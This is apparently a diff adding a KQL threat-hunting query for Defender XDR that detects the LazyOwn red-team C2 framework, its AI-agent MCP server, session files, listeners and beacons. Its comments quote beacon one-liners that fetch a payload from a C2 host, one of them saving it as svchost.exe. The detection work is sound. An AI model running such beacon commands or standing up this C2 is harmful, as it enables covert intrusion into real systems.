@@ -1,0 +1,43 @@
+// LazyOwn C2, MCP server or beacon one-liner on a host you monitor
+// Agentic attack detections by ThreatDefence (LazyOwn). Source: https://github.com/ThreatDefence/agentic-attack-detections
+// ATT&CK: T1059.006 (Command and Scripting Interpreter: Python), T1071.001 (Application Layer Protocol: Web Protocols), T1071.004 (Application Layer Protocol: DNS), T1105 (Ingress Tool Transfer)
+// Example hunt for Defender XDR advanced hunting. Test before alerting.
+// From the LazyOwn source code (grisuno/LazyOwn at f4e54de9, November 25, 2026). LazyOwn is a Python red team framework:
+//  - C2 server: python3 -W ignore lazyc2.py <port> <user> <password> (fast_run_as_r00t.sh writes the values to
+//    sessions/c2_launch.env and runs sessions/c2_launch.sh in the tmux session lazyown_sessions). Flask on werkzeug on
+//    c2_port (4444 in the shipped payload.json), bound to c2_bind_address or lhost, plus a DNS server on UDP 53.
+//  - MCP server for AI agents: python3 <dir>/skills/lazyown_mcp.py (stdio) or --sse on 127.0.0.1:9871.
+//  - Files under <checkout>/sessions/: key.aes (beacon AES key), c2_launch.env, rbac_initial_admin.txt,
+//    users_initial_admin.txt, sessionLazyOwn.json, captured_images/ (camera frames from the decoy page);
+//    .c2_credentials.txt in the checkout folder.
+//  - On a target, the beacon one-liners the c2_quickstart command prints: curl -sk '<c2><route>lin' -o /tmp/.dbus and
+//    iwr -Uri '<c2><route>win.exe' -OutFile $env:TEMP\svchost.exe.
+
+let Window = 30d;
+union isfuzzy=true
+    (DeviceProcessEvents
+        | where Timestamp > ago(Window)
+        | where ProcessCommandLine matches regex @"lazyc2\.py|lazyown_mcp(_opencode)?\.py|fast_run_as_r00t\.sh|sessions/c2_launch\.sh|\blazyown_sessions\b"
+            or (ProcessCommandLine has "python3" and ProcessCommandLine contains "lazyown.py")
+        | project Timestamp, DeviceName, Signal="LazyOwn C2, MCP server, CLI or launcher", Detail=substring(ProcessCommandLine, 0, 300),
+            Parent=strcat(InitiatingProcessFileName, " ", substring(InitiatingProcessCommandLine, 0, 150))),
+    (DeviceProcessEvents
+        | where Timestamp > ago(Window)
+        | where (ProcessCommandLine contains "/tmp/.dbus" and ProcessCommandLine has_any ("curl", "chmod"))
+            or (ProcessCommandLine contains "iwr -Uri" and ProcessCommandLine contains "win.exe" and ProcessCommandLine contains @"\svchost.exe")
+        | project Timestamp, DeviceName, Signal="LazyOwn beacon quick-start one-liner", Detail=substring(ProcessCommandLine, 0, 300),
+            Parent=strcat(InitiatingProcessFileName, " ", substring(InitiatingProcessCommandLine, 0, 150))),
+    (DeviceFileEvents
+        | where Timestamp > ago(Window)
+        | where (FolderPath matches regex @"[/\\]sessions[/\\][^/\\]+$" and FileName in~ ("key.aes", "c2_launch.env", "c2_launch.sh", "rbac_initial_admin.txt", "users_initial_admin.txt", "sessionLazyOwn.json", "LazyOwn_session_report.csv"))
+            or FolderPath contains "/sessions/captured_images/"
+            or FileName =~ ".c2_credentials.txt"
+        | summarize Files=make_set(FileName, 10), Timestamp=min(Timestamp) by DeviceName, Folder=tostring(split(FolderPath, FileName)[0])
+        | project Timestamp, DeviceName, Signal="LazyOwn session files", Detail=strcat(Folder, " ", tostring(Files)), Parent=""),
+    (DeviceNetworkEvents
+        | where Timestamp > ago(Window)
+        | where (ActionType == "ListeningConnectionCreated" and InitiatingProcessCommandLine has_any ("lazyc2.py", "lazyown_mcp.py"))
+            or RemoteUrl endswith "c2.lazyown.org"
+        | project Timestamp, DeviceName, Signal="LazyOwn listener or DNS C2 zone", Detail=strcat(LocalIP, ":", LocalPort, " ", RemoteUrl),
+            Parent=InitiatingProcessCommandLine)
+| order by Timestamp desc
